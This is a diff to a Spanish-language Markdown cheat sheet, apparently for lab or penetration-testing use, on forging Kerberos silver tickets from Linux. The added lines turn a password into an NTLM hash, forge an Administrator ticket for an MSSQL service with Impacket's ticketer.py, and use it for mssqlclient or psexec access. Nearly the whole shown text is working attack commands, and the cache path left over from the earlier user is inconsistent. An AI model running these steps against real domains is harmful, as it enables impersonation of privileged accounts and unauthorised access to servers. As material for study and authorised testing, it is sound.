@@ -55,9 +55,17 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 
 ### Linux
 
+> -spn debe de ser alguno de los que ya se tiene acceso: ej: svc_mssql solo tiene el SPN de MSSQLSvc/sqlserver.domain.com:1433 y modificar -user-id si no es el Administrator
+
 ```bash
-python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
-export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
+# COnvertir password a hash
+echo -n 'password123' | iconv -t utf16le | openssl md4
+# Armar ticket
+python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain domain.com -spn MSSQLSvc/sqlserver.domain.com:1433 Administrator -user-id 500
+export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
+# Si es mssql
+impacket-mssqlclient -k -no-pass @mssqlserver.domain.com
+# Si es algun cifs si puede ser psexec
 python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
 ```
 
